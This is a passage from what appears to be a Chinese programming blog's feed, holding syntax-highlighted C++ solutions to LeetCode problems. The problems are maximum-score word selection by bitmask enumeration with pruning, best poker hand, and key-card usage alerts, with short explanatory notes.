class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> s = <span class="number">1</span>; s &lt; (<span class="number">1</span> &lt;&lt; wn); s++) &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; wordCount = letterCount;</span><br><span class="line">            <span class="type">int</span> scoreState = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; wn; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(s &amp; (<span class="number">1</span> &lt;&lt; i)) &#123;</span><br><span class="line">                    <span class="type">int</span> wlen = words[i].<span class="built_in">length</span>();</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; wlen; j++) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(wordCount[words[i][j] - <span class="string">&#x27;a&#x27;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            wordCount[words[i][j] - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">                            scoreState += score[words[i][j] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            s = ((s &gt;&gt; (wn -i)) + <span class="number">1</span>) &lt;&lt; (wn - i);</span><br><span class="line">                            <span class="keyword">goto</span> NextState;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res = <span class="built_in">max</span>(res, scoreState);</span><br><span class="line">            NextState:;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>s的每一位表示对应wordi是否选择，复制最初的状态，统计分数，如果遇到不可以的，直接到下一个状态</p></blockquote><h3 id="剪枝"><a href="#剪枝" class="headerlink" title="剪枝"></a>剪枝</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxScoreWords</span><span class="params">(vector&lt;string&gt;&amp; words, vector&lt;<span class="type">char</span>&gt;&amp; letters, vector&lt;<span class="type">int</span>&gt;&amp; score)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> wn = words.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ln = letters.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; letterCount = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; ln; i++) &#123;</span><br><span class="line">            letterCount[letters[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> s = <span class="number">1</span>; s &lt; (<span class="number">1</span> &lt;&lt; wn);) &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; wordCount = letterCount;</span><br><span class="line">            <span class="type">int</span> scoreState = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; wn; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(s &amp; (<span class="number">1</span> &lt;&lt; (wn - i - <span class="number">1</span>))) &#123;</span><br><span class="line">                    <span class="type">int</span> wlen = words[i].<span class="built_in">length</span>();</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; wlen; j++) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(wordCount[words[i][j] - <span class="string">&#x27;a&#x27;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            wordCount[words[i][j] - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">                            scoreState += score[words[i][j] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            s = ((s &gt;&gt; (wn - i - <span class="number">1</span>)) + <span class="number">1</span>) &lt;&lt; (wn - i - <span class="number">1</span>);</span><br><span class="line">                            <span class="comment">// s += 1 &lt;&lt; (wn - i - 1);</span></span><br><span class="line">                            <span class="keyword">goto</span> NextState;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res = <span class="built_in">max</span>(res, scoreState);</span><br><span class="line">            s++;</span><br><span class="line">            NextState:;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>题解中的状态 $ s $的第 $ i $ 位(从 $ 0 $ 开始，从左往右)对应的是 $ words $ 数组中第 $ n-1-i $ 个字符串，我这里改成对应第 $ i $ 个字符串</p></blockquote><blockquote><p>对于状态 $ s $，当发现第 $ k $ 位的字符个数条件满足不了以后，第 $ k+1 $ 位至第 $ n-1 $ 位的情况都不需要考虑了，则状态直接跳转到 $ ((s &gt;&gt; (n - k - 1))  + 1) &lt;&lt; (n - k - 1) $ ,由于当前状态第 $ k $ 位后全为 $ 0 $ ，也就是当前状态s再加上 $ 1 &lt;&lt; (n - k - 1) $</p></blockquote><blockquote><p>或者状态 $ s $ 从 $ -1 $ 到 $ -(1 &lt;&lt; wn) $ </p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxScoreWords</span><span class="params">(vector&lt;string&gt;&amp; words, vector&lt;<span class="type">char</span>&gt;&amp; letters, vector&lt;<span class="type">int</span>&gt;&amp; score)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> wn = words.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ln = letters.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; letterCount = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; ln; i++) &#123;</span><br><span class="line">            letterCount[letters[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> s = <span class="number">-1</span>; s &gt; -(<span class="number">1</span> &lt;&lt; wn);) &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; wordCount = letterCount;</span><br><span class="line">            <span class="type">int</span> scoreState = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; wn; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(s &amp; (<span class="number">1</span> &lt;&lt; (wn - i - <span class="number">1</span>))) &#123;</span><br><span class="line">                    <span class="type">int</span> wlen = words[i].<span class="built_in">length</span>();</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; wlen; j++) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(wordCount[words[i][j] - <span class="string">&#x27;a&#x27;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            wordCount[words[i][j] - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">                            scoreState += score[words[i][j] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            s -= (<span class="number">1</span> &lt;&lt; (wn - i - <span class="number">1</span>));</span><br><span class="line">                            <span class="keyword">goto</span> NextState;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res = <span class="built_in">max</span>(res, scoreState);</span><br><span class="line">            s--;</span><br><span class="line">            NextState:;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;2347-最好的扑克手牌&quot;&gt;&lt;a href=&quot;#2347-最好的扑克手牌&quot; class=&quot;headerlink&quot; title=&quot;2347. 最好的扑克手牌&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/best-poker-hand/&quot;&gt;2347. 最好的扑克手牌&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;string &lt;span class=&quot;title&quot;&gt;bestHand&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; ranks, vector&amp;lt;&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt;&amp;gt;&amp;amp; suits)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;function&quot;&gt;vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt; &lt;span class=&quot;title&quot;&gt;rank_count&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;, &lt;span class=&quot;title&quot;&gt;suits_count&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            rank_count[ranks[i]&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;]++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            suits_count[suits[i] - &lt;span class=&quot;string&quot;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;]++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; count = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            count = &lt;span class=&quot;built_in&quot;&gt;max&lt;/span&gt;(count, suits_count[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(count == &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;Flush&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        count = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            count = &lt;span class=&quot;built_in&quot;&gt;max&lt;/span&gt;(count, rank_count[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(count &amp;gt;= &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;Three of a Kind&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (count == &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;Pair&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;High Card&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;1604-警告一小时内使用相同员工卡大于等于三次的人&quot;&gt;&lt;a href=&quot;#1604-警告一小时内使用相同员工卡大于等于三次的人&quot; class=&quot;headerlink&quot; title=&quot;1604. 警告一小时内使用相同员工卡大于等于三次的人&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/alert-using-same-key-card-three-or-more-times-in-a-one-hour-period/&quot;&gt;1604. 警告一小时内使用相同员工卡大于等于三次的人&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;vector&amp;lt;string&amp;gt; &lt;span class=&quot;title&quot;&gt;alertNames&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;string&amp;gt;&amp;amp; keyName, vector&amp;lt;string&amp;gt;&amp;amp; keyTime)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        map&amp;lt;string, vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;gt; hour_count;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = keyName.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; h = (keyTime[i][&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]-&lt;span class=&quot;string&quot;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;)*&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; + keyTime[i][&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] - &lt;span class=&quot;string&quot;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;, m = (keyTime[i][&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;] - &lt;span class=&quot;string&quot;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;) * &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; + keyTime[i][&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;] - &lt;span class=&quot;string&quot;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            hour_count[keyName[i]].&lt;span class=&quot;built_in&quot;&gt;push_back&lt;/span&gt;(h*&lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;+m);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        vector&amp;lt;string&amp;gt; warning_list;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;auto&lt;/span&gt; ite = hour_count.&lt;span class=&quot;built_in&quot;&gt;begin&lt;/span&gt;(); ite != hour_count.&lt;span class=&quot;built_in&quot;&gt;end&lt;/span&gt;(); ite++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; warn = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;sort&lt;/span&gt;(ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;begin&lt;/span&gt;(), ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;end&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(ite-&amp;gt;second[i+&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;] - ite-&amp;gt;second[i] &amp;lt;= &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    warn = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(warn) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                warning_list.&lt;span class=&quot;built_in&quot;&gt;push_back&lt;/span&gt;(ite-&amp;gt;first);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; warning_list;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span 